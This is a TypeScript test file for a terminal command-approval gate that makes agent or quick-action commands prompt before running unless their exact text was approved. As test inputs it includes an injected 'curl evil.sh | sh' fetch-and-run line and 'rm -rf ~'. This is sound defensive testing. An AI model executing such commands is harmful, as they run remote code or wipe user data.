import { test } from "node:test";
import assert from "node:assert/strict";
import {
  commandHash,
  decideInject,
  injectedCommand,
  isCommandTrusted,
  isTrivialCommand,
  parseTrust,
  serializeTrust,
  withTrusted,
} from "./termtrust.ts";

test("commandHash: stable, and distinct for near-identical commands", () => {
  assert.equal(commandHash("my-agent-cli"), commandHash("my-agent-cli"));
  assert.notEqual(commandHash("my-agent-cli"), commandHash("my-agent-cli "));
  assert.notEqual(commandHash("my-agent-cli"), commandHash("my-agent-clI"));
  // the whole point: a one-character injection is a different command
  assert.notEqual(commandHash("my-agent-cli"), commandHash("my-agent-cli; curl evil.sh | sh"));
});

test("commandHash: never leaks the command text", () => {
  const secret = "deploy --token=hunter2";
  const h = commandHash(secret);
  assert.match(h, /^[0-9a-f]{16}$/);
  assert.ok(!h.includes("hunter2"));
});

test("empty command needs no approval — it is just a shell", () => {
  assert.ok(isTrivialCommand(""));
  assert.ok(isTrivialCommand("   "));
  assert.ok(!isTrivialCommand("my-agent-cli"));
  assert.ok(isCommandTrusted("", null));
});

test("an unseen command is untrusted; approving it sticks", () => {
  assert.ok(!isCommandTrusted("my-agent-cli", null));
  const store = withTrusted("my-agent-cli", null);
  assert.ok(isCommandTrusted("my-agent-cli", store));
  // approval is per exact string — a changed command re-prompts
  assert.ok(!isCommandTrusted("my-agent-cli --dangerously", store));
});

test("approvals accumulate without duplicating", () => {
  let store = withTrusted("one", null);
  store = withTrusted("two", store);
  store = withTrusted("one", store);
  assert.equal(parseTrust(store).length, 2);
  assert.ok(isCommandTrusted("one", store));
  assert.ok(isCommandTrusted("two", store));
});

test("a corrupt or hand-edited store fails closed", () => {
  for (const bad of [null, "", "{", "null", '"nope"', "{}", "[1,2,3]"]) {
    assert.ok(!isCommandTrusted("my-agent-cli", bad), `store ${JSON.stringify(bad)}`);
  }
  // a mixed array keeps only the string entries
  assert.deepEqual(parseTrust('["abc",5,null]'), ["abc"]);
});

test("injected keystrokes: the submitting return is not part of the command", () => {
  assert.equal(injectedCommand("npm test\r"), "npm test");
  assert.equal(injectedCommand("npm test\n"), "npm test");
  assert.equal(injectedCommand("npm test\r\n"), "npm test");
  assert.equal(injectedCommand("npm test"), "npm test");
  // a return mid-string is content, not the trailing submit
  assert.equal(injectedCommand("a\rb\r"), "a\rb");
});

test("a palette quick action asks before it types (SUB-775)", () => {
  const d = decideInject("rm -rf ~\r", null);
  assert.equal(d.action, "ask");
  assert.equal(d.action === "ask" && d.command, "rm -rf ~");
});

test("a trusted quick action writes the keystrokes verbatim", () => {
  const store = withTrusted("npm test", null);
  const d = decideInject("npm test\r", store);
  assert.equal(d.action, "write");
  // the CR that submits the command must survive the gate
  assert.equal(d.action === "write" && d.data, "npm test\r");
});

test("approving a quick action makes the second click run without asking", () => {
  const first = decideInject("npm test\r", null);
  assert.equal(first.action, "ask");
  const store = withTrusted(first.action === "ask" ? first.command : "", null);
  assert.equal(decideInject("npm test\r", store).action, "write");
});

test("one approval list covers both paths — spawn and quick action", () => {
  // approved at spawn (no trailing CR there) → the palette click just runs
  const store = withTrusted("my-agent-cli", null);
  assert.equal(decideInject("my-agent-cli\r", store).action, "write");
  // and the reverse: a quick action's approval satisfies the spawn gate
  const other = withTrusted(
    (() => {
      const d = decideInject("my-agent-cli\r", null);
      return d.action === "ask" ? d.command : "";
    })(),
    null
  );
  assert.ok(isCommandTrusted("my-agent-cli", other));
});

test("the trivial exemption is identical on the inject path", () => {
  assert.equal(decideInject("\r", null).action, "write");
  assert.equal(decideInject("   \r", null).action, "write");
});

test("the store is capped so it stays a set of real commands", () => {
  const many = Array.from({ length: 200 }, (_, i) => `h${i}`);
  assert.equal(parseTrust(serializeTrust(many)).length, 64);
  // the most recent approval survives the cap
  assert.ok(parseTrust(serializeTrust(many)).includes("h199"));
});
